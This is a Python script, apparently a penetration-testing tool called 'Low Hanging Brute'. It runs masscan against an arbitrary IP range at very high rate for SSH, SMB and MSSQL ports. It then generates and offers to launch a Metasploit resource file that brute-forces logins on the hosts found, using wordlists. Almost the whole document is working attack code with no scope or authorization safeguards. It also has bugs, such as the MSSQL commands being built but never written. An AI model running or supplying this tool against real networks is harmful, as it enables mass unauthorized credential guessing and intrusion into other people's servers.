#!/usr/bin/env python

"""
Script that auto brute forces common services by generating RC files for MSF. Idea inspired from @jstnkndy
@awhitehatter
"""

import os, sys, subprocess, time, json
import xml.etree.ElementTree as ET

class Colors():
    W  = '\033[0m'  # white (normal)
    R  = '\033[31m' # red
    G  = '\033[32m' # green
    O  = '\033[33m' # orange
    B  = '\033[34m' # blue
    P  = '\033[35m' # purple
    C  = '\033[36m' # cyan
    GR = '\033[37m' # gray

def usage():
    if len(sys.argv) != 2:
        print ('Usage: lowhangingbrute.py {IP/Subnet}')
        print ('Example: lowhangingbrute.py 0.0.0.0/8')
        sys.exit(0)

def bullet(x):
    print (Colors.W + '[' + Colors.R + '*' + Colors.W + '] ' + x)

def banner():
    subprocess.call(['clear'])
    print (Colors.C + '$' * 25)
    print ('$$$ Low Hanging Brute $$$')
    print ('$' * 25 + '\n' + Colors.W)

def scanner(masscan, network):

    #Clean out old scan results
    x = open('scan.xml', 'w')
    x.write('')
    x.close()

    #write masscan conf file
    conf = open('/tmp/mass.conf', 'w')
    conftxt =(
    '''
rate =     100000.00
randomize-hosts = true
seed = 8218243488352209781
shard = 1/1
# OUTPUT/REPORTING SETTINGS
output-format = json
show = open,,
output-filename = scan.json
# TARGET SELECTION (IP, PORTS, EXCLUDES)
ports = 22,445,1433
range = {}
capture = cert
nocapture = html
nocapture = heartbleed

    ''').format(network)
    conf.write(conftxt)
    conf.close()

    #run masscan
    subprocess.call([masscan, '-c', '/tmp/mass.conf'], executable=masscan)


def parser():
    #generate our host files
    smbtxt = open('smb.txt', 'w')
    sqltxt = open('sql.txt', 'w')
    sshtxt = open('ssh.txt', 'w')

    '''
    Masscan doesn't output clean JSON, so we have to do some slight modification
    '''
    #create a clean file, make the first line valid JSON
    clean_data = open('clean_scan.json', 'w')
    clean_data.write('[ \n')
    clean_data.close()

    with open('scan.json') as dirty_data, open('clean_scan.json', 'a') as clean_data:
        #remove non-formated status messages from masscan
        for line in dirty_data:
            if 'finished' not in line:
                clean_data.writelines(line)
        #add a line that cleanly closes JSON, which makes the parser happy
        #All we really need to do here is delete the last comma, if you have a better way, by all means...
        clean_data.write('\n { "null":"null"} ] \n')
        clean_data.close()
        dirty_data.close()

    with open('clean_scan.json') as data_file:
        data = json.load(data_file)

    '''Now we can parse the JSON'''
    for key, value in enumerate(data[:-1]):
        address = str(data[key]['ip'])
        status = str(data[key]['ports'][0]['status'])
        port = str(data[key]['ports'][0]['port'])
        if status == 'open' and port == '22':

            sshtxt.write(address + '\n')
        elif status == 'open' and port == '445':
            bullet('Found SMB Hosts, writing to smb.txt')
            smbtxt.write(address + '\n')
        elif status == 'open' and port == '1433':
            bullet('Found SQL hosts, writing to sql.txt')
            sqltxt.write(address + '\n')

    #close our files
    data_file.close()
    smbtxt.close()
    sqltxt.close()
    sshtxt.close()

def msf_rc_gen(smb_usernames, smb_passwords, ssh_passwords, ssh_usernames, sql_passwords, sql_usernames, msfconsole):

    sshrc = ''
    smbrc = ''
    sqlrc = ''

    #Check what RC files we need to generate
    while True:
        try:
            if not os.stat('ssh.txt').st_size == 0:
                sshrc = True
                sshhosts = os.path.abspath('ssh.txt')
                sshusers = os.path.abspath(ssh_usernames)
                sshpass = os.path.abspath(ssh_passwords)
                bullet('Found SSH Hosts')
            if not os.stat('smb.txt').st_size == 0:
                smbrc = True
                smbhosts = os.path.abspath('smb.txt')
                smbusers = os.path.abspath(smb_usernames)
                smbpass = os.path.abspath(smb_passwords)
                bullet('Found SMB Hosts')
            if not os.stat('sql.txt').st_size == 0:
                sqlrc = True
                sqlhosts = os.path.abspath('sql.txt')
                sqlusers = os.path.abspath(sql_usernames)
                sqlpass = os.path.abspath(sql_passwords)
                bullet('Found SQL Hosts')
            if not sshrc and not smbrc and not sqlrc:
                bullet('No Hosts Data Found')
                sys.exit()
            break
        except (OSError):
            bullet('\nSomething has gone wrong..')
            bullet('I cannot find the text files which contain the host IP addresses')
            bullet('Shutting down...\n')
            sys.exit(1)

    msfrc = open('lowhangingbrute.rc', 'w')

    if sshrc:
        sshtxt = (
'''
\n#ssh_login RC
use auxiliary/scanner/ssh/ssh_login
set RHOSTS file:/%s
set PASS_FILE %s
set USER_FILE %s
run
''') %(sshhosts, sshpass, sshusers)
        msfrc.write(sshtxt)

    if smbrc:
        domain = raw_input('What domain shall I set for smblogin?: ')
        smbtxt = (
'''
\n#SMB_Login RC'
use auxiliary/scanner/smb/smb_login
set SMBDomain%s
set RHOSTS file:/%s
set PASS_FILE %s
set USER_FILE %s
run
''') %(domain, smbhosts, smbpass, smbusers)

        msfrc.write(smbtxt)

    if sqlrc:
        sqltxt = (
'''
#MSSQL_Login RC')
use auxiliary/scanner/mssql/mssql_login
set RHOSTS file://%s
set PASS_FILE %s
set USER_FILE %s
run
''') % (sqlhosts, sqlpass, sqlusers)

    msfrc.write('\ncreds')
    msfrc.close()

    bullet('RC file generated')

    while True:
        msfcmd = raw_input(Colors.O + '[' + Colors.R + '*' + Colors.O + '] Would you like to run MSF now? [Y/n] : ')

        if msfcmd.lower() == '':
            msfcmd = 'y'
        rc_file = os.path.abspath('lowhangingbrute.rc')

        if msfcmd.lower() == 'y':
            subprocess.call([msfconsole, '-r', rc_file], executable=msfconsole)
            break
        elif msfcmd.lower() == 'n':
            bullet('Ok, Quitting...')
            sys.exit()
        else:
            print('\n')
            bullet('Answer not recognized')
            print('\n')




def main():
     #check usage
     usage()
     network = sys.argv[1]

     banner()

     '''
     *************************************
     >>>>>>YOU NEED TO SET THE BELOW<<<<<<
     *************************************
     '''
     masscan = '/opt/masscan/bin/masscan'
     msfconsole = '/opt/metasploit-framework/msfconsole'
     smb_usernames = '/usr/share/wordlists/smb_user.txt'
     smb_passwords = '/usr/share/wordlists/smb_pass.txt'
     ssh_usernames = '/usr/share/wordlists/ssh_users.txt'
     ssh_passwords = '/usr/share/wordlists/ssh_pass.txt'
     sql_usernames = '/usr/share/wordlists/sql_users.txt'
     sql_passwords = '/usr/share/wordlists/sql_pass.txt'

     #clean out any stale files
     bullet('Cleaning stale files...')
     if os.path.isfile('clean_scan.json'):
        os.remove('clean_scan.json')
     elif os.path.isfile('scan.json'):
        os.remove('scan.json')
     elif os.path.isfile('ssh.txt'):
        os.remove('ssh.txt')
     elif os.path.isfile('smb.txt'):
        os.remove('smb.txt')
     elif os.path.isfile('sql.txt'):
        os.remove('sql.txt')
     elif os.path.isfile('lowhangingbrute.rc'):
        os.remove('lowhangingbrute.rc')

     #Confirm all the above files exist
     bullet('Checking paths...')
     time.sleep(2)

     pathdict = {}

     for i in ('masscan', 'msfconsole', 'smb_usernames', 'smb_passwords', 'ssh_usernames', 'ssh_passwords', 'sql_usernames', 'sql_passwords'):
         pathdict[i] = locals()[i]

     for i, value in pathdict.iteritems():
         setpath = os.path.exists(value)
         if setpath:
             print ('[' + Colors.R + '*' + Colors.W + '] ' + i + ' is found')
         else:
             print ('[' + Colors.B + '*' + Colors.W + '] ' + Colors.R + i + ' is NOT found' + Colors.W)
             setpath == False

         if setpath != True:
             print '\n'
             bullet('Some of the file paths were not set correctly, set them in the main function of this script')
             bullet('Quitting...')
             print '\n'
             sys.exit(0)

     print '\n'
     bullet('Starting Masscan ...')
     print '\n'
     time.sleep(2)

     scanner(masscan, network)

     bullet('Parsing XML from Masscan...')
     print '\n'
     time.sleep(2)

     parser()

     msf_rc_gen(smb_usernames, smb_passwords, ssh_passwords, ssh_usernames, sql_passwords, sql_usernames,msfconsole)


if __name__ == '__main__':
    main()
